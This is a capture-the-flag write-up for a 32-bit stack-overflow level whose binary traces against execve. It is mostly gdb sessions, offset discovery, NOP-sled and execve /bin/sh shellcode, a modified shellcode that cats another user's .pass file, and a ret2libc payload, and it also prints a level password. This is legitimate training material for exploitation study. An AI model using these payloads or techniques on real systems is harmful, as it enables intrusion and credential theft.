# Level04 - 32 bits - Can't use execve

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level04/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level04 | `kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf` |
| level05 | ``                                         |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

```shell
pattern create 200 input
run < <(cat /tmp/input)
  Invalid $PC address: 0x71414154
  Stopped reason: SIGSEGV
  0x71414154 in ?? ()

pattern search
  EIP+0 found at offset: 156

python -c 'print "A" * 156 + "BBBB"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

0xffffd450 --> 0xffffd470 ('A' <repeats 156 times>, "BBBB")
x/x $esp+0x20
0xffffd470:     0x41414141

SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * (156-100-23) + "\x70\xd4\xff\xff"'
> Stopped reason: SIGHUP # or SIGILL
0x08048823 in main ()
# SIGHUP before return


export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

./getenv32 SHELLCODE ~/level04
0xffffd755
python -c 'print "A" * 156 + "\x55\xd7\xff\xff"' > /tmp/exploit04

p /x 0xffffd755 + 100
$2 = 0xffffd7b9

python -c 'print "A" * 156 + "\xb9\xd7\xff\xff"' > /tmp/exploit04
```

> PTRACE_TRACEME (http://manpagesfr.free.fr/man/man2/ptrace.2.html)

    Le processus en cours va être suivi par son père. Tout signal (sauf SIGKILL) reçu par le processus l'arrêtera, et le père sera notifié grâce à wait(2). De plus, les appels ultérieurs à execve(2) par ce processus lui enverront SIGTRAP, ce qui donne au père la possibilité de reprendre le contrôle avant que le nouveau programme continue son exécution. Un processus ne doit pas envoyer cette requête si son père n'est pas prêt à le suivre. Dans cette requête, pid, addr et data sont ignorés.

```C
// source: http://shell-storm.org/shellcode/files/shellcode-571.php

#include <stdio.h>

const char shellcode[]="\x31\xc0" // xorl %eax,%eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x63\x61\x74" // push dword 0x7461632f /cat
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f /bin
"\x89\xe3" // mov ebx,esp
"\x52" // push edx
"\x68\x73\x73\x77\x64" // push dword 0x64777373 sswd
"\x68\x2f\x2f\x70\x61" // push dword 0x61702f2f //pa
"\x68\x2f\x65\x74\x63" // push dword 0x6374652f /etc
"\x89\xe1" // mov ecx,esp
"\xb0\x0b" // mov $0xb,%al
"\x52" // push edx
"\x51" // push ecx
"\x53" // push ebx
"\x89\xe1" // mov ecx,esp
"\xcd\x80" ; // int 80h

int main()
{
(*(void (*)()) shellcode)();

return 0;
}


/*
shellcode[]=	"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64"
		"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
*/
```

```shell
/home/users/level05/.pass

/hom e/us ers/ leve l05/ .pas s000

//ho me// user s//l evel 05/. pass

xxd -c4 < <(echo "//home//users//level05/.pass" | rev)
0000000: 7373 6170  ssap # 0x73736170 => \x70\x61\x73\x73
0000004: 2e2f 3530  ./50 # 0x2e2f3530 => \x30\x35\x2f\x2e
0000008: 6c65 7665  leve # 0x6c657665 => \x65\x76\x65\x6c
000000c: 6c2f 2f73  l//s # 0x6c2f2f73 => \x73\x2f\x2f\x6c
0000010: 7265 7375  resu # 0x72657375 => \x75\x73\x65\x72
0000014: 2f2f 656d  //em # 0x2f2f656d => \x6d\x65\x2f\x2f
0000018: 6f68 2f2f  oh// # 0x6f682f2f => \x2f\x2f\x68\x6f
000001c: 0a         .
```

```C
// adapted from: http://shell-storm.org/shellcode/files/shellcode-571.php

#include <stdio.h>

const char shellcode[] = "\x31\xc0"             // xorl %eax,%eax
                         "\x99"                 // cdq
                         "\x52"                 // push edx
                         "\x68\x2f\x63\x61\x74" // push dword 0x7461632f /cat
                         "\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f /bin
                         "\x89\xe3"             // mov ebx,esp
                         "\x52"                 // push edx
                         "\x70\x61\x73\x73"     // push dword 0x73736170 => pass (xxd -r <<< 0x73736170 | rev)
                         "\x30\x35\x2f\x2e"     // push dword 0x2e2f3530 => 05/.
                         "\x65\x76\x65\x6c"     // push dword 0x6c657665 => evel
                         "\x73\x2f\x2f\x6c"     // push dword 0x6c2f2f73 => s//l
                         "\x75\x73\x65\x72"     // push dword 0x72657375 => user
                         "\x6d\x65\x2f\x2f"     // push dword 0x2f2f656d => me//
                         "\x2f\x2f\x68\x6f"     // push dword 0x6f682f2f => //ho
                         "\x89\xe1"             // mov ecx,esp
                         "\xb0\x0b"             // mov $0xb,%al
                         "\x52"                 // push edx
                         "\x51"                 // push ecx
                         "\x53"                 // push ebx
                         "\x89\xe1"             // mov ecx,esp
                         "\xcd\x80";            // int 80h

int main()
{
    fprintf(stdout, "Length: %d\n", strlen(shellcode));
    (*(void (*)())shellcode)();
    return 0;
}

/*
shellcode[]=	"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52"
    "\x70\x61\x73\x73\x30\x35\x2f\x2e\x65\x76\x65\x6c\x73\x2f\x2f\x6c\x75\x73\x65\x72\x6d\x65\x2f\x2f\x2f\x2f\x68\x6f" <-- //home//users//level05/.pass
    "\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
*/
```

```shell
python -c 'print "\x90" * 80 + "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x70\x61\x73\x73\x30\x35\x2f\x2e\x65\x76\x65\x6c\x73\x2f\x2f\x6c\x75\x73\x65\x72\x6d\x65\x2f\x2f\x2f\x2f\x68\x6f\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"  + "A" * (156-80-56) + "\x70\xd4\xff\xff"'
```

ret2libc
https://beta.hackndo.com/retour-a-la-libc/

```shell
b*main
run
p system
  $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

searchmem "/bin/sh"
  Searching for '/bin/sh' in: None ranges
  Found 1 results, display max 1 items:
  libc : 0xf7f897ec ("/bin/sh")

python -c 'print "A" * OFFSET + "SYSTEM_ADDR" + "EXIT_ADDR" + "/bin/sh_ADDR"'

python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "EXIT" + "\xec\x97\xf8\xf7"'
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)
- [FR - Ecrivez votre premier shellcode en asm x86 ! (Exemple 2 : execve(/bin/sh))](https://zestedesavoir.com/articles/158/ecrivez-votre-premier-shellcode-en-asm-x86/#2-exemple-2-execve-bin-sh)

### C

#### Questions

- [how does ptrace catch fork's system call?](https://stackoverflow.com/questions/20440118/how-does-ptrace-catch-forks-system-call)

#### Man

- [Man fork](https://linux.die.net/man/3/fork)
- [Man gets](https://linux.die.net/man/3/gets)
- [Man kill](https://linux.die.net/man/3/kill)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man prctl](https://linux.die.net/man/2/prctl)
- [Man ptrace](https://linux.die.net/man/2/ptrace)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man wait](https://linux.die.net/man/2/wait)
